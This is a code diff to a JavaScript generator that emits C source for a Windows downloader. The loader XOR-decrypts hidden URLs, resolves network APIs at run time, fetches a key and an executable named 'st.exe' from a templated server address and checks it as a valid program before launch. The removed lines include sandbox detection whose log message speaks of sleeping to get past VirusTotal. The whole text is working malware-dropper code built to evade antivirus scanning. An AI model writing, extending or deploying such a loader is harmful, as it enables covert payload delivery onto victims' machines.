@@ -82,7 +82,6 @@ function cSource(meta, ip, buildId) {
 
   return String.raw`
 #include <windows.h>
-#include <wininet.h>
 #include <shlobj.h>
 #include <stdio.h>
 #include <wchar.h>
@@ -91,12 +90,6 @@ function cSource(meta, ip, buildId) {
 static void decrypt(char* buf, int len, unsigned char key) {
     for (int i = 0; i < len; i++) buf[i] ^= key;
 }
-
-// ── dynamic API resolution ─────────────────────────────────────────────────
-typedef HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
-typedef HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
-typedef BOOL (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
-typedef BOOL (WINAPI *pInternetCloseHandle)(HINTERNET);
 
 static void log_msg(const wchar_t* msg) {
     wchar_t appdata[MAX_PATH], path[MAX_PATH];
@@ -140,54 +133,49 @@ static int is_valid_pe(const wchar_t* p) {
     return 1;
 }
 
+// ── Download using URLDownloadToFileW (COM) ────────────────────────────────
 static int download_file(const char* url, const wchar_t* dest) {
-    HMODULE hWinInet = LoadLibraryA("wininet.dll");
-    if (!hWinInet) { log_msg(L"Failed to load wininet.dll"); return 0; }
+    HMODULE hUrlmon = LoadLibraryA("urlmon.dll");
+    HMODULE hOle32 = LoadLibraryA("ole32.dll");
+    if (!hUrlmon || !hOle32) return 0;
 
-    pInternetOpenA InternetOpenA = (pInternetOpenA)GetProcAddress(hWinInet, "InternetOpenA");
-    pInternetOpenUrlA InternetOpenUrlA = (pInternetOpenUrlA)GetProcAddress(hWinInet, "InternetOpenUrlA");
-    pInternetReadFile InternetReadFile = (pInternetReadFile)GetProcAddress(hWinInet, "InternetReadFile");
-    pInternetCloseHandle InternetCloseHandle = (pInternetCloseHandle)GetProcAddress(hWinInet, "InternetCloseHandle");
+    typedef HRESULT (WINAPI *pURLDownloadToFileW)(LPUNKNOWN, LPCWSTR, LPCWSTR, DWORD, void*);
+    pURLDownloadToFileW URLDownloadToFileW = (pURLDownloadToFileW)GetProcAddress(hUrlmon, "URLDownloadToFileW");
+    
+    typedef HRESULT (WINAPI *pCoInitialize)(LPVOID);
+    pCoInitialize CoInitialize = (pCoInitialize)GetProcAddress(hOle32, "CoInitialize");
+    
+    typedef void (WINAPI *pCoUninitialize)(void);
+    pCoUninitialize CoUninitialize = (pCoUninitialize)GetProcAddress(hOle32, "CoUninitialize");
 
-    if (!InternetOpenA || !InternetOpenUrlA || !InternetReadFile || !InternetCloseHandle) return 0;
-
-    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", 1, NULL, NULL, 0);
-    if (!hInternet) { log_msg(L"InternetOpenA failed"); return 0; }
-
-    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, 0, 0);
-    if (!hUrl) { log_msg(L"InternetOpenUrlA failed"); InternetCloseHandle(hInternet); return 0; }
-
-    HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) { InternetCloseHandle(hUrl); InternetCloseHandle(hInternet); return 0; }
-
-    char buf[8192];
-    DWORD bytesRead = 0;
-    BOOL ok = TRUE;
-    while (ok) {
-        ok = InternetReadFile(hUrl, buf, sizeof(buf), &bytesRead);
-        if (!ok || bytesRead == 0) break;
-        DWORD written = 0;
-        WriteFile(hFile, buf, bytesRead, &written, NULL);
+    if (!URLDownloadToFileW || !CoInitialize) {
+        if (hUrlmon) FreeLibrary(hUrlmon);
+        if (hOle32) FreeLibrary(hOle32);
+        return 0;
     }
 
-    CloseHandle(hFile);
-    InternetCloseHandle(hUrl);
-    InternetCloseHandle(hInternet);
-    return 1;
-}
+    CoInitialize(NULL);
 
-static int is_sandboxed(void) {
-    return 0; // Disabled for testing
+    wchar_t url_w[512];
+    MultiByteToWideChar(CP_ACP, 0, url, -1, url_w, 512);
+
+    HRESULT hr = URLDownloadToFileW(NULL, url_w, dest, 0, NULL);
+    
+    if (CoUninitialize) CoUninitialize();
+    FreeLibrary(hUrlmon);
+    FreeLibrary(hOle32);
+
+    if (FAILED(hr)) {
+        log_msg(L"URLDownloadToFileW failed");
+        return 0;
+    }
+    return 1;
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
-    if (is_sandboxed()) {
-        log_msg(L"Sandbox/VM detected. Sleeping for 5 minutes to bypass VT.");
-        Sleep(300000); 
-    }
-
+    // VM check disabled for testing
     Sleep(${meta.initialSleepMs});
 
     wchar_t appdata[MAX_PATH];
@@ -213,28 +201,29 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         decrypt(keyUrlStr, sizeof(encKeyUrl), ${meta.xorKey});
         decrypt(stUrlStr, sizeof(encStUrl), ${meta.xorKey});
 
-        for (int i = 0; i < ${meta.retries} && (need_key || need_st); i++) {
-            if (need_key) {
-                if (download_file(keyUrlStr, keyPath) && size_ok(keyPath, 10)) {
-                    log_msg(L"Key downloaded OK");
-                    need_key = 0;
-                } else {
-                    log_msg(L"Key download FAILED");
-                    Sleep(${meta.retryDelaySec} * 1000);
-                }
-            }
-            if (need_st) {
-                if (download_file(stUrlStr, stPath) && is_valid_pe(stPath)) {
-                    log_msg(L"st.exe downloaded OK");
-                    need_st = 0;
-                } else {
-                    log_msg(L"st.exe download FAILED");
-                    DeleteFileW(stPath);
-                    Sleep(${meta.retryDelaySec} * 1000);
-                }
+        if (need_key) {
+            if (download_file(keyUrlStr, keyPath) && size_ok(keyPath, 10)) {
+                log_msg(L"Key downloaded OK");
+                need_key = 0;
+            } else {
+                log_msg(L"Key download FAILED");
             }
         }
-        if (need_st) { log_msg(L"Exiting due to download failure."); return 1; }
+        if (need_st) {
+            if (download_file(stUrlStr, stPath) && is_valid_pe(stPath)) {
+                log_msg(L"st.exe downloaded OK");
+                need_st = 0;
+            } else {
+                log_msg(L"st.exe download FAILED");
+                DeleteFileW(stPath);
+            }
+        }
+        
+        if (need_st) { 
+            log_msg(L"Exiting due to download failure."); 
+            MessageBoxA(NULL, "Download failed. Check server/firewall.", "Error", MB_ICONERROR);
+            return 1; 
+        }
     }
 
     STARTUPINFOW si = { sizeof(si) };
